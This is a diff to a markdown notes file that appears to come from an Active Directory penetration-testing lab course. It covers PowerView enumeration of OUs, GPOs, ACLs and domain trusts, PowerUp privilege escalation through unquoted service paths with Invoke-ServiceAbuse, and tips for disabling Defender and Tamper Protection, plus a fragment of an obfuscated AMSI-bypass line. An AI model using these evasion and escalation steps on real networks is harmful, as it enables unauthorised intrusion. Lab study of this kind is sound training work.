@@ -1,5 +1,5 @@
 
-# **Things to take note of**
+# **Things to take note Of**
 
 - Remember to turn off or add an exception to your student VM's firewall when you run a listener for a reverse shell.
 - The `C:\` directory is exempted from Windows Defender, but AMSI may detect some tools when you load them.
@@ -13,7 +13,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 - You would need to turn off Tamper Protection on the student VM after getting user shell (Check Google on how to do this)
 
 
-# **Things to do once you have a User first**
+# **Things to do once you have a User First**
 
 
 - Start a PowerShell session using Invisi-Shell to avoid enhanced logging
@@ -113,6 +113,217 @@ Invoke-ShareFinder -Verbose
 # dir "\\dcorp-std520.dollarcorp.moneycorp.local\ADMIN$\"
 dir "\\dnshostname\sharename"
 ```
+
+
+
+
+
+### **List All Organizational Units**
+
+
+```powershell
+# powerview
+Get-DomainOU
+
+# Use the -Properties option to filter out just the name
+Get-DomainOU -Properties Name
+```
+
+
+### **List all the computers in {the/An} {StudentMachines OU/OU}**
+
+
+```powershell
+# powerview
+# Get OU name first
+Get-DomainOU -Properties Name
+
+# Then list all computers
+(Get-DomainOU -Identity <OU_Name>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
+```
+
+
+
+
+### **List all the GPOs**
+
+
+
+```powershell
+# powerview
+Get-DomainGPO
+```
+
+
+
+
+### **Enumerate GPO applied on the StudentMachines OU**
+
+
+```powershell
+# powerview
+# Get OU name first
+Get-DomainOU -Properties Name
+
+# Grab identity on specific OU name
+Get-DomainOU -Identity StudentMachines
+# copy the "gplink" property where you have "LDAP//:cn={Copy-This}"
+
+# Get GPO applied
+Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}'
+```
+
+
+
+
+### **ACL for the Users group**
+
+
+```powershell
+# powerview
+Get-DomainObjectAcl -Identity "Users" -ResolveGUIDs -Verbose
+```
+
+
+
+### **ACL for the Domain Admins group**
+
+
+```powershell
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
+```
+
+
+
+### **All modify rights/permissions for the student**
+
+
+```powershell
+# powerview
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student505"}
+```
+
+
+
+### **ActiveDirectory Rights for RDPUsers group**
+
+
+
+```powershell
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+```
+
+
+
+### **Get all domains in the current forest**
+
+
+
+```powershell
+Get-ForestDomain -verbose 
+
+# The "Name:" property are the domain names
+# Or just filter by Name
+Get-ForestDomain -verbose | select Name
+```
+
+
+### **Map the trusts of All Domain**
+
+
+```powershell
+# Powerview
+Get-DomainTrust
+
+# Map the trust of a domain
+Get-ForestDomain -verbose | select Name
+Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
+
+# Ouput you should look out for -:
+# SourceName
+# TargetName
+# TrustAttributes
+# TrustDirection
+```
+
+
+
+### **Map external trust in The moneycorp.local forest**
+
+
+```powershell
+Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+```
+
+
+
+
+### **Identify external trusts of the dollarcorp domain**
+
+
+
+```powershell
+Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+```
+
+
+### **Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local**
+
+
+```powershell
+# If the "TrustDirection" output of the previous command is either bi-directional trust or one-way trust
+# Then we can use the below command
+
+Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
+```
+
+
+
+![](https://i.imgur.com/bIp4vE2.png)
+
+
+
+
+
+
+# **Local Privilege Escalation**
+
+
+
+- Cd to `C:\AD\Tools`
+- Load Invisi-shell
+- Load AMSI Bypass
+- Load `Powerup.ps1` script
+
+
+```powershell
+. 'C:\Ad\Tools\PowerUp.ps1'
+```
+
+
+
+### **Get services with unquoted paths and a space in their name {Exploit}**
+
+
+```powershell
+$ Get-ServiceUnquoted -Verbose
+
+# Note down the "ServiceName:" with unquoted paths
+```
+
+
+- Then abuse function for `Invoke-ServiceAbuse` and add our current domain user to the local Administrators group
+
+
+```powershell
+# -Name: Name of service to abuse
+# -Username: Name of current user, Just run the whoami cmd
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose  
+```
+
+We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!
+
+
 
 
 
